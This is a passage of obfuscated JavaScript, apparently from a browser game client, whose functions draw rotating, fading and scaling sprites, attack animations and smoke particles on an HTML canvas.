			if (350 < ᐃⵠⵠᐃ) this.scale = Math.min(this.scale + ᐃⵠᐃᐃ / ᐃⲆⵠᐃΔ, 1.8);
			else this.scale = Math.max(this.scale - ᐃⵠᐃᐃ, ⵠⲆΔ);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			this.rotate.ⵠⲆᐃ();
			ᐃⵠⵠᐃ < 350 ? this.ᐃΔΔᐃ = Math.max(0, this.ᐃΔΔᐃ - ᐃⵠᐃᐃ * 2.2) : this.ᐃΔΔᐃ = Math.min(1, this.ᐃΔΔᐃ + ᐃⵠᐃᐃ * 2.2);
			(this.info & ⵠΔⵠΔ) === ⵠᐃⲆᐃ ? ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔᐃⵠΔⲆΔ][ⲆⲆⲆ.time] : ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔⲆΔⲆⲆⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height * this.scale;
			Δ.globalAlpha = ⵠΔΔ - this.ᐃΔΔᐃ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ΔΔⵠⵠΔ, -ⵠⵠᐃ / 4, ᐃⵠⵠ / ΔⲆΔΔΔ, ⵠⵠᐃ / Δᐃⵠⵠ);
			ᐃⵠⲆ === (this.info & 1) ? ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔⲆⲆ][ⲆⲆⲆ.time] : ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width * this.scale;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
			Δ.globalAlpha = this.ᐃΔΔᐃ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / Ⲇᐃⵠᐃ, -ⵠⵠᐃ / ⲆⵠᐃΔ, ᐃⵠⵠ / ᐃⵠⲆⲆⲆ, ⵠⵠᐃ / ⵠⵠΔⲆ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				if (this.Δᐃⵠ.ⵠⲆᐃ() && ᐃⵠⵠⲆᐃ == this.Δᐃⵠ.ᐃⲆΔ) this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ;
				Δ.globalAlpha = (ⵠΔⲆ - this.ᐃΔΔᐃ) * (.6 - this.Δᐃⵠ.ΔᐃΔ);
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠΔⵠᐃⲆⲆ];
				ᐃⵠⵠ = this.scale * (-ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ);
				ⵠⵠᐃ = this.scale * (-ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / ᐃⲆΔⲆ, ⵠⵠᐃ / ⵠΔᐃᐃⵠ);
				Δ.globalAlpha = (.6 - this.Δᐃⵠ.ΔᐃΔ) * this.ᐃΔΔᐃ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆⲆᐃΔᐃᐃ];
				ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
				ⵠⵠᐃ = this.scale * (-ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⵠΔᐃΔ, -ⵠⵠᐃ / 4, ᐃⵠⵠ / ⲆⲆΔᐃ, ⵠⵠᐃ / ᐃⵠⲆⲆⲆ);
				Δ.globalAlpha = ⵠᐃⵠΔ
			}
			if ((this.info & 1) === ⵠⲆⲆ) ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⲆⲆ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔᐃⵠᐃⲆᐃ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.scale * (-ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ);
			ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
			Δ.save();
			Δ.translate(-ⵠⵠΔΔᐃ * ᐃ, Ⲇᐃⵠⵠ * ᐃ);
			Δ.rotate(this.rotate.ΔᐃΔ);
			Δ.globalAlpha = this.ᐃΔΔᐃ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * -ᐃⵠⵠ / Ⲇᐃⵠᐃ, -ⵠⵠᐃ * ᐃ / ᐃⵠⵠΔ, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = this.ᐃΔΔᐃ * (.6 - this.Δᐃⵠ.ΔᐃΔ);
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃΔᐃΔⵠᐃ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / ⵠΔΔᐃΔ, ᐃ * -ⵠⵠᐃ / 4, ᐃⵠⵠ / ⲆⵠΔΔ, ⵠⵠᐃ / Ⲇⵠⵠᐃ);
				Δ.globalAlpha = ΔⲆᐃᐃ
			}
			Δ.restore();
			if (Δⵠᐃ === (this.info & ⵠᐃⵠΔ)) ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⵠⲆⲆ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⲆⵠᐃᐃᐃ][ⲆⲆⲆ.time];
			Δ.save();
			Δ.translate(ᐃ * ⲆⲆⲆⵠΔ, ᐃ * Δᐃᐃⵠ);
			Δ.rotate(-this.rotate.ΔᐃΔ);
			Δ.globalAlpha = this.ᐃΔΔᐃ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * -ᐃⵠⵠ / 4, -ⵠⵠᐃ * ᐃ / 4, ᐃⵠⵠ / ΔⵠᐃⲆ, ⵠⵠᐃ / ⲆⵠΔΔ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = (.6 - this.Δᐃⵠ.ΔᐃΔ) * this.ᐃΔΔᐃ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃᐃΔⲆⵠΔ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / 4, -ⵠⵠᐃ * ᐃ / ⵠⲆⵠᐃ, ᐃⵠⵠ / ⲆⲆΔᐃ, ⵠⵠᐃ / 2);
				Δ.globalAlpha = 1
			}
			Δ.globalAlpha = 1;
			Δ.restore();
			Δ.restore()
		}

		function ⲆΔⲆⵠΔΔⲆᐃⲆ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && ΔᐃⵠᐃⲆ == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ && (this.Δᐃⵠ.ⵠⲆᐃ = ⲆᐃⵠⲆⵠ);
				var ΔᐃΔ = 600 * (ᐃⵠᐃᐃ * (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)) * ᐃ;
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = 0
			}
			if (this.action == Δⵠⵠⵠ) ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠᐃ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔⵠΔⲆΔⲆ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2 + Δⵠ, -ᐃⵠ.height / ⵠⵠⵠΔ + ⲆⵠⲆ);
			Δ.restore()
		}

		function ᐃΔⲆⵠΔⲆⲆΔᐃ() {
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && false == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ && (this.Δᐃⵠ.ⵠⲆᐃ = false);
				var ΔᐃΔ = ᐃ * (600 * ((1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ));
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = Δᐃᐃⵠ;
				var ⲆⵠⲆ = Ⲇᐃⵠⵠ
			}
			this.ⲆⵠⲆⲆΔᐃΔ = (this.ⲆⵠⲆⲆΔᐃΔ + ᐃⵠᐃᐃ * 3) % (Math.PI * 2);
			this.ⵠᐃᐃⵠΔΔⵠ = (this.ⵠᐃᐃⵠΔΔⵠ - ᐃⵠᐃᐃ * ΔΔᐃΔ) % (Math.PI * ⲆᐃᐃⲆ);
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + this.y + ⲆⵠⲆ);
			Δ.save();
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃΔⲆᐃ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ⲆⲆΔᐃ, -ᐃⵠ.height / ⲆⵠΔΔ);
			Δ.restore();
			Δ.save();
			Δ.rotate(this.ⲆⵠⲆⲆΔᐃΔ);
			ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃⲆ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ⲆⵠΔΔ, -ᐃⵠ.height / ⲆⵠΔΔ);
			Δ.restore();
			Δ.save();
			Δ.rotate(this.ⵠᐃᐃⵠΔΔⵠ);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠᐃⵠⵠⲆᐃ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2);
			Δ.restore();
			Δ.restore()
		}

		function ᐃΔⲆᐃⵠᐃΔᐃⵠ(ᐃΔ, ⲆⵠⵠⲆⲆⲆⵠⲆⲆ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (ᐃΔ === Ⲇ.ᐃⲆΔⵠΔ) {
				ᐃΔ = Ⲇ.ⲆᐃⲆΔᐃ;
				this.info = 36
			}
			ᐃⵠ = ⵠⲆ[ᐃΔ][this.info][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width / ⵠΔᐃᐃⵠ;
			ⵠⵠᐃ = -ᐃⵠ.height / 2;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				this.Δᐃⵠ.ⵠⲆᐃ() && ⲆΔⲆᐃΔ == this.Δᐃⵠ.ᐃⲆΔ && (this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ);
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ΔⲆᐃΔⵠⲆⲆ = ⵠⵠⵠΔⲆⲆΔ(this.info, ᐃⵠ, ΔᐃⲆⵠⵠΔᐃΔᐃ);
				ΔⲆΔⵠ(Δ, ΔⲆᐃΔⵠⲆⲆ, -ᐃⵠⵠ / Ⲇᐃᐃⵠ, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = 1
			}
			Δ.restore()
		}

		function ⵠᐃⲆΔΔᐃⵠⵠᐃ() {
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (ᐃⵠΔ === this.info) ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆⵠⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width;
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⲆⲆΔᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				if (this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == ᐃᐃΔᐃΔ) this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ;
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠΔⵠⲆΔⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⲆⲆΔᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ΔⲆⵠ
			}
			Δ.restore()
		}

		function ⲆΔⲆᐃᐃⵠᐃⲆⵠ() {
			if ((this.info & ΔΔΔ) === 1) this.ᐃⲆⲆⲆⵠ = Math.min(this.ᐃⲆⲆⲆⵠ + ᐃⵠᐃᐃ, 2.2);
			else {
				this.ᐃⲆⲆⲆⵠ = Math.max(this.ᐃⲆⲆⲆⵠ - ᐃⵠᐃᐃ, ⲆΔⵠ);
				this.ΔᐃⵠⵠⲆΔΔ += ᐃⵠᐃᐃ;
				if (.1 < this.ΔᐃⵠⵠⲆΔΔ) {
					this.ΔᐃⵠⵠⲆΔΔ = 0;
					var ⵠⲆⲆⵠ = {
						x: this.x + Math.random() * 60 - 30,
						y: this.y + Math.random() * 60 - 30,
						a: ΔΔⵠ,
						r: 30 * Math.random() + 30
					};
					this.ⵠⲆⲆⵠ.push(ⵠⲆⲆⵠ)
				}
			}
			for (var ⵠᐃ = 0; ⵠᐃ < this.ⵠⲆⲆⵠ.length; ⵠᐃ++) {
				var ⵠⲆⲆⵠ = this.ⵠⲆⲆⵠ[ⵠᐃ];
				Δ.save();
				Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + ⵠⲆⲆⵠ.x, ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆⲆⵠ.y);
				ⵠⲆⲆⵠ.a = Math.min(ⵠᐃⵠΔ, ⵠⲆⲆⵠ.a + ᐃⵠᐃᐃ / Ⲇᐃᐃⵠ);
				var ᐃΔΔᐃ = ⵠⲆⲆⵠ.a;
				if (.2 > ᐃΔΔᐃ) ᐃΔΔᐃ *= 5;
				else if (ᐃΔΔᐃ > .8) ᐃΔΔᐃ = (ⵠⲆΔ - ᐃΔΔᐃ) * ⵠᐃΔⵠ;
				else ᐃΔΔᐃ = 1;
				Δ.globalAlpha = .8 * ᐃΔΔᐃ;
				ⵠᐃᐃ(Δ, ΔⲆⵠⲆ, ΔΔⵠ, ⵠⲆⲆⵠ.r);
				ΔⲆ(Δ, Ⲇ.ᐃᐃΔⵠⲆⲆᐃ[ⲆⲆⲆ.time]);
				Δ.restore();
				ⵠⲆⲆⵠ.a === 1 && (this.ⵠⲆⲆⵠ.splice(ⵠᐃ, ΔΔΔ), ⵠᐃ--)
			}
		}

		function ΔⲆⵠΔΔⵠᐃΔⵠ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			var ᐃⵠⵠᐃ = ΔΔⲆᐃ.ᐃⵠⵠᐃ(this, this.r);
			350 < ᐃⵠⵠᐃ ? this.scale = Math.min(this.scale + ᐃⵠᐃᐃ / ᐃⲆⵠᐃ, 1.8) : this.scale = Math.max(this.scale - ᐃⵠᐃᐃ, 1);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			this.rotate.ⵠⲆᐃ();
			ᐃⵠⵠᐃ < 350 ? this.ᐃΔΔᐃ = Math.max(ⵠⲆᐃⵠ, this.ᐃΔΔᐃ - ᐃⵠᐃᐃ * 2.2) : this.ᐃΔΔᐃ = Math.min(1, this.ᐃΔΔᐃ + 2.2 * ᐃⵠᐃᐃ);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⲆⲆᐃ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width * this.scale;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
			Δ.globalAlpha = 1 - this.ᐃΔΔᐃ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / Ⲇᐃᐃⵠ);
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⲆΔⵠⵠⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.scale * (-ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ);
			ⵠⵠᐃ = this.scale * (this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height);
			Δ.globalAlpha = this.ᐃΔΔᐃ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ΔⲆⲆⲆ, -ⵠⵠᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				if (this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == false) this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ;
				Δ.globalAlpha = (Ⲇᐃⵠ - this.ᐃΔΔᐃ) * (.6 - this.Δᐃⵠ.ΔᐃΔ);
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠⲆⵠΔᐃⲆ];
				ᐃⵠⵠ = this.scale * (this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width);
				ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / ⲆᐃᐃⲆ, ⵠⵠᐃ / ᐃⲆΔⲆ);
				Δ.globalAlpha = (.6 - this.Δᐃⵠ.ΔᐃΔ) * this.ᐃΔΔᐃ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠᐃⵠ];
				ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width * this.scale;
				ⵠⵠᐃ = this.scale * (this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height);
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / Ⲇⵠⵠⵠ, -ⵠⵠᐃ / Ⲇᐃⵠᐃ, ᐃⵠⵠ / ⲆⵠΔΔ, ⵠⵠᐃ / ᐃⲆⵠᐃΔ);
				Δ.globalAlpha = 1
			}
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃⲆΔⲆΔΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.scale * (-ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ);
			ⵠⵠᐃ = this.scale * (-ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ);
			Δ.save();
			Δ.translate(ᐃ * -40, ᐃ * 80);
			Δ.rotate(this.rotate.ΔᐃΔ);
			Δ.globalAlpha = this.ᐃΔΔᐃ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / 4, ᐃ * -ⵠⵠᐃ / ΔΔⵠⵠΔ, ᐃⵠⵠ / ⲆⲆΔᐃ, ⵠⵠᐃ / 2);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = (.6 - this.Δᐃⵠ.ΔᐃΔ) * this.ᐃΔΔᐃ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔΔⵠᐃᐃ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / 4, ᐃ * -ⵠⵠᐃ / ⵠⵠΔᐃΔ, ᐃⵠⵠ / 2, ⵠⵠᐃ / Δⵠⵠⵠ);
				Δ.globalAlpha = ΔΔᐃⵠ
			}
			Δ.restore();
			ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆⵠⲆΔⲆᐃ][ⲆⲆⲆ.time];
			Δ.save();
			Δ.translate(40 * ᐃ, ᐃ * 80);
			Δ.rotate(-this.rotate.ΔᐃΔ);
			Δ.globalAlpha = this.ᐃΔΔᐃ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * -ᐃⵠⵠ / 4, -ⵠⵠᐃ * ᐃ / ⵠⵠΔᐃΔ, ᐃⵠⵠ / ⲆᐃᐃⲆ, ⵠⵠᐃ / ⲆΔΔⵠ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = (.6 - this.Δᐃⵠ.ΔᐃΔ) * this.ᐃΔΔᐃ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠΔᐃᐃⲆΔ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ * ᐃ / ⲆⵠᐃⲆ, -ⵠⵠᐃ * ᐃ / Ⲇᐃⵠᐃ, ᐃⵠⵠ / ⲆⲆΔᐃ, ⵠⵠᐃ / ⲆᐃᐃⲆ);
				Δ.globalAlpha = 1
			}
			Δ.globalAlpha = 1;
			Δ.restore();
			Δ.restore()
		}

		function ΔⲆΔⵠⵠᐃᐃᐃΔ(ᐃⲆⲆ) {
			if (0 <= ᐃⲆⲆ.right) {
				switch (ᐃⲆⲆ.right) {
					case Ⲇ.ⵠⲆⲆⵠⵠ:
						Δ.save();
						var ⵠᐃᐃΔⵠᐃᐃ = ᐃⲆⲆ.attack.ΔᐃΔ * -ΔΔⵠΔ / Math.PI;
						if (ᐃⲆⲆ.attack.ᐃⲆΔ) var ⲆⵠⲆⵠΔⵠΔ = -Math.PI / 3 - (Math.PI / 3 + ᐃⲆⲆ.attack.ΔᐃΔ) / ΔⲆᐃⲆ;
						else var ⲆⵠⲆⵠΔⵠΔ = ᐃⲆⲆ.attack.ΔᐃΔ;
						Δ.rotate(ᐃⲆⲆ.angle - Math.PI / 2 + ⲆⵠⲆⵠΔⵠΔ);
						Δ.globalAlpha = ⵠᐃᐃΔⵠᐃᐃ / 1.2;
						ⵠᐃᐃ(Δ, ᐃ * -40, 90 * ᐃ, ᐃ * ᐃΔΔⲆ);
						ΔⲆ(Δ, ⵠ[124]);
						Δ.globalAlpha = ⵠᐃᐃΔⵠᐃᐃ / 1.2;
						ⵠᐃᐃ(Δ, ᐃ * -52, ᐃ * ᐃΔᐃⲆΔ, ᐃ * ΔᐃΔⲆⲆ);
						ΔⲆ(Δ, ⵠ[124]);
						Δ.globalAlpha = ⵠᐃᐃΔⵠᐃᐃ / 1.2;
						ⵠᐃᐃ(Δ, -30 * ᐃ, ᐃ * 95, ᐃ * 4);
						ΔⲆ(Δ, ⵠ[124]);
						Δ.globalAlpha = ΔᐃⲆⵠ;
						Δ.restore();
						break;
					case Ⲇ.ΔⵠⵠΔᐃ:
					case Ⲇ.ΔΔⲆⵠΔ:
					case Ⲇ.ⵠᐃΔΔᐃ:
					case Ⲇ.ⵠᐃᐃⲆΔ:
						if (ᐃⲆⲆ.ΔⵠΔⲆΔᐃᐃ === 1) break;
						if (ᐃⲆⲆ.ⵠΔΔⲆΔ > ᐃΔΔ) var ᐃΔ = Ⲇ.ⵠⵠᐃⲆΔⵠⵠ[ⲆⲆⲆ.time];
						else if (ᐃⲆⲆ.ⵠⲆΔⲆΔⲆᐃ > ΔΔⵠ || ᐃⵠⲆⵠ < ᐃⲆⲆ.ᐃᐃⲆΔⲆ) var ᐃΔ = Ⲇ.ⵠᐃⵠⲆᐃⲆᐃ[ⲆⲆⲆ.time];
						else var ᐃΔ = Ⲇ.ⵠⲆᐃⵠⵠΔⲆ[ⲆⲆⲆ.time];
						var ⵠᐃᐃΔⵠᐃᐃ = -3 * ᐃⲆⲆ.attack.ΔᐃΔ / Math.PI;
						if (ᐃⲆⲆ.attack.ᐃⲆΔ) var ⲆⵠⲆⵠΔⵠΔ = Math.max(.5 - ⵠᐃᐃΔⵠᐃᐃ / 2 + .5, ᐃⵠΔ);
						else var ⲆⵠⲆⵠΔⵠΔ = Math.max(ⵠᐃᐃΔⵠᐃᐃ / 2, 0);
						ⲆⵠⲆⵠΔⵠΔ === 0 && (ᐃⲆⲆ.ᐃΔⲆⵠⵠⲆΔ = ᐃⲆⲆ.angle);
						Δ.save();
						Δ.rotate(ᐃⲆⲆ.ᐃΔⲆⵠⵠⲆΔ - Math.PI / ⲆⵠΔΔ);
						Δ.globalAlpha = ⵠᐃᐃΔⵠᐃᐃ;
						var ⵠⵠⵠᐃⲆΔⵠ = 25 * ᐃ + 25 * ⲆⵠⲆⵠΔⵠΔ;
						ⵠᐃᐃ(Δ, ⵠⵠⵠᐃⲆΔⵠ, 80 * ᐃ, ⲆᐃⲆΔⲆ * ᐃ);
						ΔⲆ(Δ, ᐃΔ);
						ⵠᐃᐃ(Δ, -ⵠⵠⵠᐃⲆΔⵠ, 80 * ᐃ, ᐃ * 15);
						ΔⲆ(Δ, ᐃΔ);
						Δ.globalAlpha = ΔⲆᐃᐃ;
						Δ.restore();
						break
				}
			}
		}

		function ⵠⲆⵠΔⵠΔⵠᐃΔ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.info & 31 && this.info & 992 && (this.info & 31744) != 31744 && (this.ᐃⵠΔⲆΔ.length == ⵠⲆⲆ || Ⲇ.ΔΔΔⲆⵠᐃⲆ >= this.ᐃⵠΔⲆΔ[this.ᐃⵠΔⲆΔ.length - 1])) this.ᐃⵠΔⲆΔ.push(Ⲇ.ᐃΔᐃⲆᐃΔᐃ);
			for (var ⵠᐃ = ᐃⵠⲆⵠ; this.ᐃⵠΔⲆΔ.length > ⵠᐃ; ⵠᐃ++) {
				this.ᐃⵠΔⲆΔ[ⵠᐃ] = Math.max(ⲆΔⵠ, this.ᐃⵠΔⲆΔ[ⵠᐃ] - Ⲇ.ΔⲆⲆᐃᐃⵠΔ * ᐃⵠᐃᐃ);
				Δ.globalAlpha = this.ᐃⵠΔⲆΔ[ⵠᐃ] / 1.3;
				var ΔᐃΔ = (ΔⵠⲆΔ - this.ᐃⵠΔⲆΔ[ⵠᐃ]) * 40;
				var ⲆⲆⵠ = (Ⲇᐃⵠ - this.ᐃⵠΔⲆΔ[ⵠᐃ]) * 35 + 10;
				ⵠᐃᐃ(Δ, -68 * ᐃ + Math.sin(-this.angle - Math.PI / ⵠΔᐃᐃⵠ) * ΔᐃΔ, ᐃ * -ⲆᐃᐃΔΔ + ΔᐃΔ * Math.cos(-this.angle - Math.PI / 2), ⲆⲆⵠ);
				ΔⲆ(Δ, "#333333")
			}
			Δ.globalAlpha = 1;
			this.ᐃⵠΔⲆΔ.length > ⵠⲆᐃⵠ && 0 === this.ᐃⵠΔⲆΔ[0] && this.ᐃⵠΔⲆΔ.shift();
			Δ.restore()
		}

		function ΔΔᐃⵠⲆΔⵠⲆᐃ(ᐃΔ, ΔⲆᐃΔⵠⲆⲆ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ;
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / ⵠΔⲆᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
